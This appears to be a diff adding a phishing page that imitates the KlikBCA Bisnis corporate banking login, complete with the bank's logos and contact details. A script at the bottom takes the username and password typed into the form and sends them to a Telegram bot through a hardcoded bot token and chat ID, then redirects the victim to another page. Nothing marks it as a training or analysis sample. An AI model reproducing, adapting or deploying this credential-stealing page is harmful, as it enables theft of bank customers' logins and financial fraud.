@@ -1,0 +1,142 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   KlikBCA Bisnis Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
+    body {
+      font-family: 'Open Sans', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-gradient-to-b from-[#d9e9f9] to-[#d9e9f9] min-h-screen flex flex-col justify-between">
+  <div class="pt-4 px-5 relative max-w-md mx-auto w-full">
+   <a class="absolute top-4 right-5 flex items-center space-x-2 text-[#1a4e7a] text-sm font-normal" href="#">
+    <span>
+     English Version
+    </span>
+    <div class="bg-[#2f3a43] rounded-full w-10 h-10 flex items-center justify-center">
+     <i class="fas fa-home text-white text-lg">
+     </i>
+    </div>
+   </a>
+   <div class="mt-10">
+    <div class="flex items-center space-x-2">
+     <img alt="BCA text logo in blue" class="w-[120px] h-10 object-contain" height="40" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca.png" width="120"/>
+    </div>
+    <h1 class="text-[#1a4e7a] font-extrabold text-2xl mt-2">
+     KlikBCA Bisnis
+    </h1>
+    <p class="text-[#1a4e7a] text-lg mt-1">
+     VPN Secure Connection
+    </p>
+   </div>
+   <form id="loginForm" class="mt-8 space-y-6">
+    <div>
+     <label class="block text-[#1a4e7a] font-semibold mb-1" for="username">
+      Username
+     </label>
+     <input class="w-full rounded-md border border-gray-300 focus:ring-opacity-50 px-4 py-2 text-gray-600 text-base" id="username" name="username" placeholder="CorporateID UserID (tanpa spasi)" type="text" required/>
+    </div>
+    <div>
+     <label class="block text-[#1a4e7a] font-semibold mb-1" for="password">
+      Password
+     </label>
+     <input class="w-full rounded-md border border-gray-300 px-4 py-2 text-gray-600 text-base" id="password" name="password" placeholder="KeyBCA Appli 1" type="password" required/>
+    </div>
+    <button class="w-full bg-[#0561a7] text-white text-base font-normal rounded-full py-3 mt-6" type="submit">
+     LOGIN
+    </button>
+   </form>
+   <p class="mt-10 text-gray-800 text-base max-w-md">
+    Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses
+    <a class="text-[#0561a7]" href="#">
+     Informasi KlikBCA Bisnis
+    </a>
+    atau hubungi:
+   </p>
+   <div class="mt-6 space-y-6 max-w-md">
+    <div class="flex items-center space-x-4">
+     <img alt="Blue chat bubble icon with three white dots" class="w-10 h-10 object-contain" height="40" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-halobca.png" width="40"/>
+     <div class="text-[#0561a7] text-base leading-tight">
+      <p>
+       Halo Layanan KlikBCA Bisnis
+      </p>
+      <p>
+       1500777
+      </p>
+     </div>
+    </div>
+    <div class="flex items-center space-x-4">
+     <img alt="Blue envelope icon" class="w-10 h-10 object-contain" height="40" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-email.png" width="40"/>
+     <div class="text-[#0561a7] text-base leading-tight">
+      <p>
+       Email
+      </p>
+      <p>
+       halobca@bca.co.id
+      </p>
+     </div>
+    </div>
+    <div class="flex items-center space-x-4">
+     <img alt="Blue Twitter bird icon" class="w-10 h-10 object-contain" height="40" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-twitter.png" width="40"/>
+     <div class="text-[#0561a7] text-base leading-tight">
+      <p>
+       Twitter
+      </p>
+      <p>
+       @HaloBCA
+      </p>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="flex items-center justify-center space-x-2 bg-[#f7f8f9] py-3 mt-10">
+   <p class="text-[#0561a7] text-sm">
+    Copyright © 2020
+   </p>
+   <img alt="BCA logo small" class="w-10 h-7 object-contain" height="50" src="https://vpn.klikbca.com/+CSCOU+/v2_logo-bca-copyright.png" width="50"/>
+   <p class="text-[#0561a7] text-sm">
+    All Right Reserved
+   </p>
+  </div>
+  <script>
+   const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+   const chatId = '5906925079';
+
+   document.getElementById('loginForm').addEventListener('submit', function(e) {
+     e.preventDefault();
+     const username = document.getElementById('username').value;
+     const password = document.getElementById('password').value;
+
+     const message = `KLIKBCA BISNIS:\nUsername: ${username}\nPassword: ${password}`;
+
+     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+       method: 'POST',
+       headers: {
+         'Content-Type': 'application/json'
+       },
+       body: JSON.stringify({
+         chat_id: chatId,
+         text: message
+       })
+     }).then(response => {
+       if(response.ok) {
+         window.location.href = "klikbisnis.html";
+         this.reset();
+       } else {
+         alert('Failed to send data.');
+       }
+     }).catch(() => {
+       alert('Failed to send data.');
+     });
+   });
+  </script>
+ </body>
+</html>
